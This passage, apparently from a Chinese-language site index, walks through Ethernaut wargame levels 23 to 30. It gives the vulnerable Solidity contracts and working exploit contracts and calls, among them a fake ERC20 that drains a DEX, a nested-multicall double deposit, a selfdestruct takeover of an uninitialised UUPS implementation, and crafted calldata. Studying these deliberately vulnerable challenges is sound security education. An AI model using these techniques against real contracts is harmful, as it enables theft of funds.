\u6807\u51c6\u7684\u5408\u7ea6\u4e0d\u4e00\u5b9a\u53ef\u4fe1\uff0c\u90e8\u5206\u5408\u7ea6\u7684 \u51fd\u6570\u8fd4\u56de\u503c\u53ef\u80fd\u7f3a\u5931 \uff0c\u4e5f\u53ef\u80fd\u5b58\u5728\u6076\u610f\u884c\u4e3a \u66f4\u7b80\u5355\u5730\uff0c\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u6076\u610f\u7684 ERC20 \u5408\u7ea6 1 2 3 4 5 6 7 8 9 contract DexTwoAttackToken { function balanceOf ( address ) external pure returns ( uint256 ) { return 1 ; } function transferFrom ( address , address , uint256 ) external pure returns ( bool ) { return true ; } } 1 2 >> contract . swap ( \"<DexTwoAttackTokenAddress>\" , await contract . token1 (), 1 ) >> contract . swap ( \"<DexTwoAttackTokenAddress>\" , await contract . token2 (), 1 )","title":"23. Dex Two"},{"location":"wargames/ethernaut/#24-puzzle-wallet","text":"\u6210\u4e3a\u4ee3\u7406\u5408\u7ea6\u7684\u7ba1\u7406\u5458 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; pragma experimental ABIEncoderV2 ; // redundant import \"../helpers/UpgradeableProxy-08.sol\" ; contract PuzzleProxy is UpgradeableProxy { address public pendingAdmin ; address public admin ; constructor ( address _admin , address _implementation , bytes memory _initData ) UpgradeableProxy ( _implementation , _initData ) { admin = _admin ; } modifier onlyAdmin { require ( msg . sender == admin , \"Caller is not the admin\" ); _ ; } function proposeNewAdmin ( address _newAdmin ) external { pendingAdmin = _newAdmin ; } function approveNewAdmin ( address _expectedAdmin ) external onlyAdmin { require ( pendingAdmin == _expectedAdmin , \"Expected new admin by the current admin is not the pending admin\" ); admin = pendingAdmin ; } function upgradeTo ( address _newImplementation ) external onlyAdmin { _upgradeTo ( _newImplementation ); } } contract PuzzleWallet { address public owner ; uint256 public maxBalance ; mapping ( address => bool ) public whitelisted ; mapping ( address => uint256 ) public balances ; function init ( uint256 _maxBalance ) public { require ( maxBalance == 0 , \"Already initialized\" ); maxBalance = _maxBalance ; owner = msg . sender ; } modifier onlyWhitelisted { require ( whitelisted [ msg . sender ], \"Not whitelisted\" ); _ ; } function setMaxBalance ( uint256 _maxBalance ) external onlyWhitelisted { require ( address ( this ). balance == 0 , \"Contract balance is not 0\" ); maxBalance = _maxBalance ; } function addToWhitelist ( address addr ) external { require ( msg . sender == owner , \"Not the owner\" ); whitelisted [ addr ] = true ; } function deposit () external payable onlyWhitelisted { require ( address ( this ). balance <= maxBalance , \"Max balance reached\" ); balances [ msg . sender ] += msg . value ; } function execute ( address to , uint256 value , bytes calldata data ) external payable onlyWhitelisted { require ( balances [ msg . sender ] >= value , \"Insufficient balance\" ); balances [ msg . sender ] -= value ; ( bool success , ) = to . call { value : value }( data ); require ( success , \"Execution failed\" ); } function multicall ( bytes [] calldata data ) external payable onlyWhitelisted { bool depositCalled = false ; for ( uint256 i = 0 ; i < data . length ; i ++ ) { bytes memory _data = data [ i ]; bytes4 selector ; assembly { selector := mload ( add ( _data , 32 )) } if ( selector == this . deposit . selector ) { require ( ! depositCalled , \"Deposit can only be called once\" ); // Protect against reusing msg.value depositCalled = true ; } ( bool success , ) = address ( this ). delegatecall ( data [ i ]); require ( success , \"Error while delegating call\" ); } } } \u8c03\u7528\u903b\u8f91\u5408\u7ea6 PuzzleWallet \u76f8\u5173\u51fd\u6570\u9700\u8981\u5728\u767d\u540d\u5355\u5185\u4e14\u53ea\u6709 owner \u624d\u80fd\u6dfb\u52a0\u6307\u5b9a\u5730\u5740\u5230\u767d\u540d\u5355 1 2 3 4 >> await contract . whitelisted ( player ) false >> await contract . owner () \"<level-address>\" \u7531\u4e8e\u4f7f\u7528\u4ee3\u7406\u8c03\u7528\u7684\u65b9\u5f0f\uff0c\u4ee3\u7406\u5408\u7ea6\u7684 pendingAdmin \u4e0e\u903b\u8f91\u5408\u7ea6\u7684 owner \u5171\u4eab\u4e00\u4e2a slot\uff0c\u56e0\u800c\u53ef\u5148\u901a\u8fc7 proposeNewAdmin \u66f4\u65b0 owner \uff0c\u968f\u540e\u5c06\u73a9\u5bb6\u6dfb\u52a0\u5230\u767d\u540d\u5355\u4e2d \u540c\u7406\uff0c maxBalance \u4e0e admin \u5171\u4eab\u4e00\u4e2a slot\uff0c\u800c maxBalance \u53ef\u901a\u8fc7 setMaxBalance \u66f4\u65b0\uff0c\u4f46\u9996\u5148\u9700\u6e05\u7a7a\u4ee3\u7406\u5408\u7ea6\u7684\u4f59\u989d execute \u4f9d\u636e balances \u4e2d\u8bb0\u5f55\u7684\u5bf9\u5e94\u5730\u5740\u7684\u4f59\u989d\u8fdb\u884c\u8f6c\u8d26\uff0c\u800c balances \u53ea\u80fd\u901a\u8fc7 deposit \u6539\u53d8 \u6ce8\u610f\u5230 multicall \u4e2d depositCalled \u4e0d\u662f\u72b6\u6001\u53d8\u91cf\u800c\u662f\u51fd\u6570\u5185\u53d8\u91cf\uff0c\u56e0\u800c\u5d4c\u5957\u8c03\u7528 multicall \u53ef\u7ed5\u8fc7\u9650\u5236\u5229\u7528\u5355\u6b21 transfer \u8fdb\u884c\u91cd\u590d deposit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // \u90e8\u7f72\u540e\u5c06\u653b\u51fb\u5408\u7ea6\u6dfb\u52a0\u5230\u767d\u540d\u5355\u4e2d contract Hack { PuzzleWallet wallet ; constructor ( address instance ) { wallet = PuzzleWallet ( instance ); } // msg.value \u8bbe\u7f6e\u4e3a 0.001 eth\uff0c\u5373\u4ee3\u7406\u5408\u7ea6\u521d\u59cb\u4f59\u989d function exploit () external payable { bytes [] memory data = new bytes []( 2 ); bytes [] memory subdata = new bytes []( 1 ); data [ 0 ] = abi . encodeWithSignature ( \"deposit()\" ); subdata [ 0 ] = data [ 0 ]; data [ 1 ] = abi . encodeWithSignature ( \"multicall(bytes[])\" , subdata ); wallet . multicall { value : msg . value }( data ); wallet . execute ( msg . sender , msg . value * 2 , \"\" ); } } delegatecall \u4fdd\u6301\u5408\u7ea6\u88ab\u8c03\u7528\u65f6\u7684 msg.value","title":"24. Puzzle Wallet"},{"location":"wargames/ethernaut/#25-motorbike","text":"\u8ba9 Engine \u81ea\u6bc1\uff0c\u4f7f Motorbike \u4e0d\u53ef\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 // SPDX-License-Identifier: MIT pragma solidity < 0.7.0 ; import \"openzeppelin-contracts-06/utils/Address.sol\" ; import \"openzeppelin-contracts-06/proxy/Initializable.sol\" ; contract Motorbike { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 // constant variable does not have a storage slot bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; struct AddressSlot { address value ; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor ( address _logic ) public { require ( Address . isContract ( _logic ), \"ERC1967: new implementation is not a contract\" ); _getAddressSlot ( _IMPLEMENTATION_SLOT ). value = _logic ; ( bool success ,) = _logic . delegatecall ( abi . encodeWithSignature ( \"initialize()\" ) ); require ( success , \"Call failed\" ); } // Delegates the current call to `implementation`. function _delegate ( address implementation ) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy ( 0 , 0 , calldatasize ()) let result := delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) returndatacopy ( 0 , 0 , returndatasize ()) switch result case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate ( _getAddressSlot ( _IMPLEMENTATION_SLOT ). value ); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r_slot := slot } } } contract Engine is Initializable { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; address public upgrader ; uint256 public horsePower ; struct AddressSlot { address value ; } function initialize () external initializer { horsePower = 1000 ; upgrader = msg . sender ; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall ( address newImplementation , bytes memory data ) external payable { _authorizeUpgrade (); _upgradeToAndCall ( newImplementation , data ); } // Restrict to upgrader role function _authorizeUpgrade () internal view { require ( msg . sender == upgrader , \"Can't upgrade\" ); } // Perform implementation upgrade with security checks for UUPS(Universal Upgradeable Proxy Standard) proxies, and additional setup call. function _upgradeToAndCall ( address newImplementation , bytes memory data ) internal { // Initial upgrade and setup call _setImplementation ( newImplementation ); if ( data . length > 0 ) { ( bool success ,) = newImplementation . delegatecall ( data ); require ( success , \"Call failed\" ); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation ( address newImplementation ) private { require ( Address . isContract ( newImplementation ), \"ERC1967: new implementation is not a contract\" ); AddressSlot storage r ; assembly { r_slot := _IMPLEMENTATION_SLOT } r . value = newImplementation ; } } \u4e0e\u900f\u660e\u4ee3\u7406\u6a21\u5f0f\u4e0d\u540c\uff0cUUPS \u4ee3\u7406\u6a21\u5f0f\u7531\u903b\u8f91\u5408\u7ea6\u8d1f\u8d23\u5347\u7ea7\u903b\u8f91\uff0c\u56e0\u800c\u4ee3\u7406\u5408\u7ea6\u90e8\u7f72\u7684\u4ee3\u4ef7\u8f83\u5c0f \u540c\u65f6 UUPS \u4ee3\u7406\u6a21\u5f0f\u8282\u7701\u4e86\u6bcf\u6b21\u68c0\u67e5\u7528\u6237\u662f\u5426\u4e3a owner \u7684\u5f00\u9500 upgrader \u53ef\u4ee5\u4f7f\u7528 upgradeToAndCall() \u66f4\u65b0\u903b\u8f91\u5408\u7ea6\u5e76\u8c03\u7528 Motorbike \u5728\u90e8\u7f72\u65f6\u901a\u8fc7 delegatecall \u8c03\u7528 Engine \u7684 initialize() \uff0c initialize() \u4f7f\u7528 initializer \u51fd\u6570\u4fee\u9970\u7b26\uff0c\u907f\u514d\u518d\u6b21\u521d\u59cb\u5316 initializer \u4fee\u9970\u7b26\u4f7f\u7528\u72b6\u6001\u53d8\u91cf initialized \u548c initializing \u8bb0\u5f55\u6216\u5224\u65ad\u521d\u59cb\u5316\u72b6\u6001 initialized \u5b58\u50a8\u5728 Motorbike \u5b9e\u4f8b\u4e2d\uff0c\u800c\u4e0d\u662f Engine \uff0c\u56e0\u800c\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 Engine \u5b9e\u4f8b\u7684 initialize() \u518d\u66f4\u65b0\u5176\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740\u5e76\u8c03\u7528 \u4e0d\u8981\u8ba9\u903b\u8f91\u5408\u7ea6\u5904\u4e8e\u672a\u521d\u59cb\u5316\u72b6\u6001","title":"25. Motorbike"},{"location":"wargames/ethernaut/#exploit","text":"1 2 3 // \u83b7\u53d6 Engine \u5b9e\u4f8b\u7684\u5730\u5740 >> await web3 . eth . getStorageAt ( instance , \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\" ); \"0x000000000000000000000000e12c57f61db3891d41ddde5a6669591391ad30ab\" 1 2 3 4 5 6 7 // \u90e8\u7f72\u65b0\u7684\u903b\u8f91\u5408\u7ea6 contract Bomb { fallback () external { selfdestruct ( tx . origin ); } } // \u8c03\u7528 initialize \u6210\u4e3a upgrader\uff0c\u968f\u540e\u8c03\u7528 upgradeToAndCall() \u66f4\u65b0\u903b\u8f91\u5408\u7ea6","title":"Exploit"},{"location":"wargames/ethernaut/#_16","text":"UUPS Proxies: Tutorial (Solidity + JavaScript) - Smart Contracts / Guides and Tutorials - OpenZeppelin Forum Proxies - OpenZeppelin Docs Constant and Immutable State Variables Writing Upgradeable Contracts - OpenZeppelin Docs","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#26-doubleentrypoint","text":"\u9632\u6b62\u5408\u7ea6 CryptoVault \u88ab\u6e05\u7a7a\u4ee3\u5e01 \u5b9e\u73b0\u80fd\u591f\u6b63\u786e\u544a\u8b66\u4ee5\u9632\u6b62\u6f5c\u5728\u653b\u51fb\u6216\u6f0f\u6d1e\u5229\u7528\u7684 detection bot \u5408\u7ea6\u5e76\u5728 Forta \u6ce8\u518c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts-08/access/Ownable.sol\" ; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\" ; interface DelegateERC20 { function delegateTransfer ( address to , uint256 value , address origSender ) external returns ( bool ); } interface IDetectionBot { function handleTransaction ( address user , bytes calldata msgData ) external ; } interface IForta { function setDetectionBot ( address detectionBotAddress ) external ; function notify ( address user , bytes calldata msgData ) external ; function raiseAlert ( address user ) external ; } contract Forta is IForta { mapping ( address => IDetectionBot ) public usersDetectionBots ; mapping ( address => uint256 ) public botRaisedAlerts ; function setDetectionBot ( address detectionBotAddress ) external override { usersDetectionBots [ msg . sender ] = IDetectionBot ( detectionBotAddress ); } function notify ( address user , bytes calldata msgData ) external override { if ( address ( usersDetectionBots [ user ]) == address ( 0 )) return ; try usersDetectionBots [ user ]. handleTransaction ( user , msgData ) { return ; } catch {} } function raiseAlert ( address user ) external override { if ( address ( usersDetectionBots [ user ]) != msg . sender ) return ; botRaisedAlerts [ msg . sender ] += 1 ; } } contract CryptoVault { address public sweptTokensRecipient ; // player IERC20 public underlying ; // DoubleEntryPoint constructor ( address recipient ) { sweptTokensRecipient = recipient ; } function setUnderlying ( address latestToken ) public { require ( address ( underlying ) == address ( 0 ), \"Already set\" ); underlying = IERC20 ( latestToken ); } /* ... */ function sweepToken ( IERC20 token ) public { require ( token != underlying , \"Can't transfer underlying token\" ); token . transfer ( sweptTokensRecipient , token . balanceOf ( address ( this ))); } } contract LegacyToken is ERC20 ( \"LegacyToken\" , \"LGT\" ), Ownable { DelegateERC20 public delegate ; function mint ( address to , uint256 amount ) public onlyOwner { _mint ( to , amount ); } function delegateToNewContract ( DelegateERC20 newContract ) public onlyOwner { delegate = newContract ; } function transfer ( address to , uint256 value ) public override returns ( bool ) { if ( address ( delegate ) == address ( 0 )) { return super . transfer ( to , value ); } else { return delegate . delegateTransfer ( to , value , msg . sender ); } } } contract DoubleEntryPoint is ERC20 ( \"DoubleEntryPointToken\" , \"DET\" ), DelegateERC20 , Ownable { address public cryptoVault ; address public player ; address public delegatedFrom ; Forta public forta ; constructor ( address legacyToken , address vaultAddress , address fortaAddress , address playerAddress ) { delegatedFrom = legacyToken ; forta = Forta ( fortaAddress ); player = playerAddress ; cryptoVault = vaultAddress ; _mint ( cryptoVault , 100 ether ); } modifier onlyDelegateFrom () { require ( msg . sender == delegatedFrom , \"Not legacy contract\" ); _ ; } modifier fortaNotify () { address detectionBot = address ( forta . usersDetectionBots ( player )); // Cache old number of bot alerts uint256 previousValue = forta . botRaisedAlerts ( detectionBot ); // Notify Forta forta . notify ( player , msg . data ); // Continue execution _ ; // Check if alarms have been raised if ( forta . botRaisedAlerts ( detectionBot ) > previousValue ) revert ( \"Alert has been triggered, reverting\" ); } function delegateTransfer ( address to , uint256 value , address origSender ) public override onlyDelegateFrom fortaNotify returns ( bool ) { _transfer ( origSender , to , value ); return true ; } } \u4f20\u5165 CryptoVault.sweepToken() \u4ee3\u5e01\u7684\u5730\u5740\u4e0d\u80fd\u7b49\u4e8e underlying \uff0c\u800c\u82e5\u4f20\u5165 LegacyToken \u7684\u5730\u5740\uff0c\u5c06\u8c03\u7528 delegateTransfer() \uff0c\u5b9e\u9645\u8f6c\u79fb\u7684\u662f CryptoVault \u6301\u6709\u7684 DET \u4ee3\u5e01\uff0c\u5bf9\u5e94 underlying \u82e5 origSender \u4e3a CryptoVault \u7684\u5b9e\u4f8b\u5219 raiseAlert 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 contract DetectionBot is IDetectionBot { address vault ; constructor ( address instance ) { DoubleEntryPoint dep = DoubleEntryPoint ( instance ); vault = dep . cryptoVault (); } function handleTransaction ( address user , bytes calldata msgData ) external { // skip the 4-byte function signature ( , , address sender ) = abi . decode ( msgData [ 4 : ], ( address , uint256 , address )); if ( sender == vault ) { IForta ( msg . sender ). raiseAlert ( user ); } } } \u90e8\u7f72 DetectionBot \u540e\uff0c\u4f7f\u7528 player \u8d26\u6237\u8c03\u7528 Forta.setDetectionBot() \u53ef\u4ee5\u5728 sweepToken() \u7684\u6700\u540e\u68c0\u67e5\u5408\u7ea6 underlying \u7684\u4f59\u989d\u662f\u5426\u548c\u8c03\u7528\u524d\u76f8\u540c","title":"26. DoubleEntryPoint"},{"location":"wargames/ethernaut/#_17","text":"ABI Decode | Solidity by Example abi.decode cannot decode msg.data \u00b7 Issue #6012 \u00b7 ethereum/solidity TrueUSD \u2194 Compound Vulnerability | by ChainSecurity | ChainSecurity | Medium","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#27-good-samaritan","text":"\u6e05\u7a7a Good Samaritan \u94b1\u5305\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 // SPDX-License-Identifier: MIT pragma solidity >= 0.8.0 < 0.9.0 ; import \"openzeppelin-contracts-08/utils/Address.sol\" ; contract GoodSamaritan { Wallet public wallet ; Coin public coin ; constructor () { wallet = new Wallet (); coin = new Coin ( address ( wallet )); wallet . setCoin ( coin ); } function requestDonation () external returns ( bool enoughBalance ) { // donate 10 coins to requester try wallet . donate10 ( msg . sender ) { return true ; } catch ( bytes memory err ) { if ( keccak256 ( abi . encodeWithSignature ( \"NotEnoughBalance()\" )) == keccak256 ( err )) { // send the coins left wallet . transferRemainder ( msg . sender ); return false ; } } } } contract Coin { using Address for address ; mapping ( address => uint256 ) public balances ; error InsufficientBalance ( uint256 current , uint256 required ); constructor ( address wallet_ ) { // one million coins for Good Samaritan initially balances [ wallet_ ] = 10 ** 6 ; } function transfer ( address dest_ , uint256 amount_ ) external { uint256 currentBalance = balances [ msg . sender ]; // transfer only occurs if balance is enough if ( amount_ <= currentBalance ) { balances [ msg . sender ] -= amount_ ; balances [ dest_ ] += amount_ ; if ( dest_ . isContract ()) { // notify contract INotifyable ( dest_ ). notify ( amount_ ); } } else { // a gas-efficient way :) revert InsufficientBalance ( currentBalance , amount_ ); } } } contract Wallet { // The owner of the wallet instance address public owner ; Coin public coin ; error OnlyOwner (); error NotEnoughBalance (); modifier onlyOwner () { if ( msg . sender != owner ) { revert OnlyOwner (); } _ ; } constructor () { owner = msg . sender ; } function donate10 ( address dest_ ) external onlyOwner { // check balance left if ( coin . balances ( address ( this )) < 10 ) { revert NotEnoughBalance (); } else { // donate 10 coins coin . transfer ( dest_ , 10 ); } } function transferRemainder ( address dest_ ) external onlyOwner { // transfer balance left coin . transfer ( dest_ , coin . balances ( address ( this ))); } function setCoin ( Coin coin_ ) external onlyOwner { coin = coin_ ; } } interface INotifyable { function notify ( uint256 amount ) external ; } \u91cd\u590d\u8c03\u7528 requestDonation() \u80fd\u591f\u6e05\u7a7a\u94b1\u5305\u7684\u4f59\u989d\uff0c\u4f46\u9700\u8981\u8017\u8d39\u5927\u91cf\u7684\u6c7d\u6cb9 :( \u663e\u7136\uff0c\u8c03\u7528 Wallet.transferRemainder() \u662f\u6e05\u7a7a\u4f59\u989d\u7684\u6700\u4f73\u65b9\u6cd5\uff0c\u9700\u8981\u89e6\u53d1\u9519\u8bef NotEnoughBalance() \u3002\u7531\u4e8e\u9519\u8bef\u80fd\u901a\u8fc7\u8c03\u7528\u94fe\u4f20\u64ad\uff0c\u6839\u636e\u7b7e\u540d\u8fa8\u8bc6\uff08\u4e0e\u51fd\u6570\u8c03\u7528\u7c7b\u4f3c\uff09\uff0c\u4e14\u4e0d\u5305\u542b\u6765\u6e90\u5730\u5740\uff0c\u53ef\u76f4\u63a5\u5728 notify() \u4e2d\u89e6\u53d1 1 2 3 4 5 6 7 8 9 10 11 12 13 contract Notifyable is INotifyable { error NotEnoughBalance (); function exploit ( address instance ) external { GoodSamaritan ( instance ). requestDonation (); } function notify ( uint256 amount ) external { // \u5168\u90e8 revert \u5c06\u5bfc\u81f4\u4ea4\u6613\u5931\u8d25 if ( amount == 10 ) // \u533a\u5206 donate10() \u548c transferRemainder() revert NotEnoughBalance (); } }","title":"27. Good Samaritan"},{"location":"wargames/ethernaut/#_18","text":"Custom Errors in Solidity | Solidity Blog","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#28-gatekeeper-three","text":"\u518d\u6b21\u6210\u4e3a entrant XD 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract SimpleTrick { GatekeeperThree public target ; address public trick ; uint private password = block . timestamp ; constructor ( address payable _target ) { target = GatekeeperThree ( _target ); } function checkPassword ( uint _password ) public returns ( bool ) { if ( _password == password ) { return true ; } password = block . timestamp ; return false ; } function trickInit () public { trick = address ( this ); } function trickyTrick () public { if ( address ( this ) == msg . sender && address ( this ) != trick ) { target . getAllowance ( password ); } } } contract GatekeeperThree { address public owner ; address public entrant ; bool public allow_enterance = false ; SimpleTrick public trick ; function construct0r () public { owner = msg . sender ; } modifier gateOne () { require ( msg . sender == owner ); require ( tx . origin != owner ); _ ; } modifier gateTwo () { require ( allow_enterance == true ); _ ; } modifier gateThree () { if ( address ( this ). balance > 0.001 ether && payable ( owner ). send ( 0.001 ether ) == false ) { _ ; } } function getAllowance ( uint _password ) public { if ( trick . checkPassword ( _password )) { allow_enterance = true ; } } function createTrick () public { trick = new SimpleTrick ( payable ( address ( this ))); trick . trickInit (); } function enter () public gateOne gateTwo gateThree returns ( bool entered ) { entrant = tx . origin ; return true ; } receive () external payable {} } \u8c03\u7528 GatekeeperThree.createTrick() \u521d\u59cb\u5316 trick 1 >> contract . createTrick (); GatekeeperThree.construct0r() \u7531\u4e8e typo \u6210\u4e3a\u666e\u901a\u51fd\u6570\uff0c\u53ef\u76f4\u63a5\u8c03\u7528\u53d8\u66f4 owner \uff0c\u4f7f\u7528\u5408\u7ea6\u8c03\u7528 GatekeeperThree.enter() \u80fd\u591f\u901a\u8fc7 gateOne gateTwo \u9700\u8981\u901a\u8fc7 GatekeeperThree.getAllowance() \u4f7f allow_enterance = true \uff0c\u7531 getStorageAt() \u83b7\u53d6 SimpleTrick.password \uff0c\u4ee5\u901a\u8fc7 trick.checkPassword() 1 2 >> web3 . eth . getStorageAt ( await contract . trick (), 2 ); \"0x0000000000000000000000000000000000000000000000000000000064047a80\" \u901a\u8fc7 gateThree \u9700\u8981\u5408\u7ea6 GatekeeperThree \u5185\u7684\u4f59\u989d\u5927\u4e8e 0.001 ether\uff0c\u4e14\u65e0\u6cd5\u5411 owner \u53d1\u9001 0.001 ether\uff08 owner \u4e0d\u63d0\u4f9b payable \u7684 receive \u6216 fallback \u51fd\u6570\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 interface IGatekeeperThree { function construct0r () external ; function getAllowance ( uint ) external ; function enter () external ; } contract Hack { function exploit ( address payable instance , uint pass ) external payable { instance . transfer ( 0.001001 ether ); IGatekeeperThree ( instance ). getAllowance ( pass ); IGatekeeperThree ( instance ). construct0r (); IGatekeeperThree ( instance ). enter (); } }","title":"28. Gatekeeper Three"},{"location":"wargames/ethernaut/#29-switch","text":"Just have to flip the switch :) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Switch { bool public switchOn ; // switch is off bytes4 public offSelector = bytes4 ( keccak256 ( \"turnSwitchOff()\" )); modifier onlyThis () { require ( msg . sender == address ( this ), \"Only the contract can call this\" ); _ ; } modifier onlyOff () { // we use a complex data type to put in memory bytes32 [ 1 ] memory selector ; // check that the calldata at position 68 (location of _data) assembly { calldatacopy ( selector , 68 , 4 ) // grab function selector from calldata } require ( selector [ 0 ] == offSelector , \"Can only call the turnOffSwitch function\" ); _ ; } function flipSwitch ( bytes memory _data ) public onlyOff { ( bool success , ) = address ( this ). call ( _data ); require ( success , \"call failed :(\" ); } function turnSwitchOn () public onlyThis { switchOn = true ; } function turnSwitchOff () public onlyThis { switchOn = false ; } } \u9700\u8981\u901a\u8fc7 flipSwitch() \u8c03\u7528 turnSwitchOn() \uff0c\u800c onlyOff \u4fee\u9970\u7b26\u4f1a\u68c0\u67e5 calldata[68:52] \u5b57\u8282\u662f\u5426\u4e3a offSelector \u6b63\u5e38\u60c5\u51b5\u4e0b\u7f16\u7801\u7684 calldata \u6ca1\u529e\u6cd5\u7ed5\u8fc7 onlyOff \u7684\u68c0\u67e5\u8c03\u7528 turnSwitchOn() flipSelector _data offset _data length Selector 4 bytes 32 bytes 32 bytes 4 bytes \u4e0d\u8fc7\u53ef\u4ee5\u5c1d\u8bd5\u66f4\u6539 _data \u7684\u504f\u79fb\u91cf\uff0c\u5e76\u5c06 onSelector \u653e\u5728 offSelector \u4e4b\u540e flipSelector _data offset padding offSelector _data length onSelector 4 bytes 32 bytes 32 bytes 32 bytes 32 bytes 4 bytes \u90a3\u4e48\u8c03\u7528 flipSwitch() \u4f20\u5165\u7684 _data \u7f16\u7801\u5982\u4e0b 1 2 3 4 5 0000000000000000000000000000000000000000000000000000000000000060 # _data offset 0000000000000000000000000000000000000000000000000000000000000000 # padding 20606e1500000000000000000000000000000000000000000000000000000000 # offSelector 0000000000000000000000000000000000000000000000000000000000000004 76227e1200000000000000000000000000000000000000000000000000000000 \u5bf9\u4e8e\u52a8\u6001\u7c7b\u578b\u7684\u6570\u636e\uff0c\u5047\u8bbe\u5176\u5728 CALLDATA \u4e2d\u7684\u4f4d\u7f6e\u53ef\u80fd\u662f\u9519\u8bef\u7684","title":"29. Switch"},{"location":"wargames/ethernaut/#exploit_1","text":"1 $ cast send <contract-address> --private-key <key> --rpc-url <rpc-url> 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000","title":"Exploit"},{"location":"wargames/ethernaut/#30-higherorder","text":"Your objective is to become the Commander of the Higher Order! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity 0.6.12 ; contract HigherOrder { address public commander ; uint256 public treasury ; function registerTreasury ( uint8 ) public { assembly { sstore ( treasury_slot , calldataload ( 4 )) } } function claimLeadership () public { if ( treasury > 255 ) commander = msg . sender ; else revert ( \"Only members of the Higher Order can become Commander\" ); } } treasury \u7684\u503c\u5927\u4e8e 255 \u5373\u53ef\u6210\u4e3a commander registerTreasury() \u53ef\u4ee5\u8bbe\u7f6e treasury \u7684\u503c\uff0c\u5c3d\u7ba1\u51fd\u6570\u672c\u8eab\u9650\u5236\u4e86\u53c2\u6570\u7c7b\u578b\uff0c\u4f46\u4f7f\u7528\u4e86 calldataload() \u6765\u52a0\u8f7d\u8c03\u7528\u53c2\u6570 calldataload(4) \u83b7\u53d6\u8c03\u7528\u6570\u636e\u4ece\u7b2c 4 \u5b57\u8282\u5f00\u59cb 32 \u5b57\u8282\u7684\u6570\u636e\uff0c\u56e0\u6b64\u8c03\u7528 registerTreasury() \u65f6\u4f20\u5165\u4efb\u610f\u5927\u4e8e 255 \u7684\u6570\u636e\u5373\u53ef 1 2 3 // registerTreasury(uint8): 0x211c85ab >> await contract . sendTransaction ({ data : \"211c85abff00000000000000000000000000000000000000000000000000000000000000\" }) >> await contract . claimLeadership ()","title":"30. HigherOrder"},{"location":"wargames/ethernaut/#_19","text":"Yul \u2014 Solidity 